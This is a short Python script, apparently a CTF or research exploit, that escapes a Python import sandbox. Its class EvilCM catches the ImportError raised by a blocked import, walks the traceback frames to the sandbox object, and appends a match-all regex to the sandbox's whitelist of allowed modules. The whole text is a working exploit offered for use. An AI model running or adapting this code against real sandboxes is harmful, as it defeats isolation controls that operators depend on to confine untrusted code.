
def break_sandbox():
    """Patches sandbox to add match-all regex to sandbox whitelist
    """
    class EvilCM(object):
        def __enter__(self):
            return self
        def __exit__(self, exc_type, exc, tb):
            import re
            tb.tb_next.tb_next.tb_next.tb_frame.f_locals['self']._enabled_regexes.append(re.compile('.*'))
            return True
    try:
        import sqlite3
    except ImportError:
        with EvilCM():
            __import__('sqlite3')
